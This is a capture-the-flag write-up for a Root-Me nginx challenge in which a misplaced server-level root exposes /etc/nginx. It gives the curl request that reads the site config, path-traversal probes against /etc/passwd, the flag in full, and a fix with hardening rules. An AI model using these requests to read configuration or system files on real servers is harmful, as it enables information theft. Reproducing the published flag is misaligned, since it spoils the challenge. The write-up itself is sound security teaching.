# Root-Me — Web-Server: Nginx - Root Location Misconfiguration (ch93) — SOLVED

**Target:** `http://challenge01.root-me.org/web-serveur/ch93/` → 301 → `http://challenge01.root-me.org:59093/`
**Challenge:** "Missing Root Location" (15 pts, author .Yo0x)
**Goal:** Prove the intranet isn't secure by reading the server configuration.

## Flag

```
RM{b3_C4r3fU1_ab0uT_R00t_L0cat1on<3}
```

36 characters, verified byte-exact with `od -c` (note the literal `<3` before the closing brace).

## Exploit

One request:

```bash
curl "http://challenge01.root-me.org:59093/conf.d/default.conf"
```

Response (tail):

```nginx
    error_page 404 =200 /error.txt;

    location /error.txt {
	internal;
    }
}

#Congratulation the flag is RM{b3_C4r3fU1_ab0uT_R00t_L0cat1on<3}
```

## Step by step

### 1. Follow the redirect
`GET /web-serveur/ch93/` returns `301 → http://challenge01.root-me.org:59093/login/login.html`.
Everything must be requested on port **59093** (`Server: nginx/1.27.2`) — probing the default
port just returns the same redirect for every path, which looks like "nothing here".

### 2. Read the config that was handed to us
The statement includes the site config. The line that matters is the second one:

```nginx
server {
    listen       59093;
    server_name  _;
    root /etc/nginx;          # <-- document root is the nginx config directory

    location = / { return 302 /login/login.html; }
    location /login/ { alias /usr/share/nginx/html/login/; }
    location /static/ { alias /var/www/app/static/; }

    location / {
        try_files $uri $uri/ =404;
        default_type text/plain;      # <-- serves whatever it finds as plain text
    }
    ...
}
```

`location /` has **no `root` directive of its own**, so it inherits `root /etc/nginx` from the
server block. Every URI that isn't `/`, `/login/` or `/static/` is resolved as a file under
`/etc/nginx` and served — with `default_type text/plain`, so the config renders as text rather
than being downloaded.

### 3. Walk the config directory
`/nginx.conf` (the main config) confirms the layout — it ends with
`include /etc/nginx/conf.d/default.conf;`. That include is the site config, so:

```
GET /conf.d/default.conf   ->   /etc/nginx/conf.d/default.conf   ->  flag
```

The exposed files, for context:

| Path | Result |
|---|---|
| `/nginx.conf` | 200 — 654 B, main config |
| `/mime.types` | 200 — 5349 B |
| `/fastcgi_params`, `/uwsgi_params`, `/scgi_params` | 200 |
| **`/conf.d/default.conf`** | **200 — 527 B, contains the flag** |

### 4. Confirm the boundary
Traversal *out* of `/etc/nginx` is correctly blocked — nginx normalises `../` before resolving,
so the request falls through to `try_files ... =404`:

| Request | Result |
|---|---|
| `/../etc/passwd` | 404 → error page |
| `/..%2fetc/passwd` | 400 (bad request) |
| `/%2e%2e/etc/passwd` | 404 → error page |
| `/....//etc/passwd` | 404 → error page |

So the exposure is exactly the nginx configuration directory — which is enough, because that is
where the secret was.

### Note: the 404 handler masks enumeration
`error_page 404 =200 /error.txt;` turns every miss into a **200** with the internal error page,
so a naive scanner sees `200` for non-existent paths too (e.g. `/koi-utf`, `/sites-enabled/default`
all return `200`, 527 B — the error page, not real files). Status code alone is not a reliable
existence oracle here; content length/content is. That is worth remembering before concluding
"this file exists".

## Root cause

The server-level `root /etc/nginx;` is a placeholder/mistake that was never meant to be the
document root, and `location /` — the catch-all — is **missing its own `root`**, so it inherits
it. Two compounding problems:

1. **The document root points at a sensitive directory.** nginx will happily serve any file
   under it; nothing distinguishes "static content" from "server configuration". CWE-548
   (Exposure of Information Through Directory Listing) / CWE-200.
2. **A missing `root` in the catch-all location is silent.** `location /` looks harmless because
   it only does `try_files`, but with no `root` it inherits whatever the server block set. The
   fix is not obvious from reading the location block in isolation, which is the point of the
   challenge title.

Also relevant: the flag was stored **inside a web-served directory**, in a comment. Comments are
not a secret store.

## Fix

```nginx
server {
    listen       59093;
    server_name  _;

    # A real, dedicated document root -- never a system/config directory.
    root /var/www/intranet/public;

    location = / {
        return 302 /login/login.html;
    }

    # Give every location its own explicit root so nothing can silently inherit a bad one.
    location /login/ {
        root /usr/share/nginx/html;   # or keep alias, but keep it inside the webroot
    }

    location / {
        root /var/www/intranet/public;   # explicit, not inherited
        try_files $uri $uri/ =404;
    }
}
```

Additional hardening:

- **Deny dotfiles and config extensions** at the server level, so even a bad `root` cannot leak
  secrets: `location ~ /\. { deny all; }` and `location ~* \.(conf|cnf|ini|log)$ { deny all; }`.
- **Never store secrets in the document root** — keep them outside any path a web server can
  serve, and load them via environment/secret storage.
- **Do not set `default_type text/plain` on a catch-all** unless you mean to serve arbitrary
  files as text; it turns any mis-resolved path into readable output instead of a download.
- Remember `error_page 404 =200 ...` defeats status-code-based monitoring and enumeration — use
  it only when you deliberately want that, and prefer `=404` so monitoring stays meaningful.
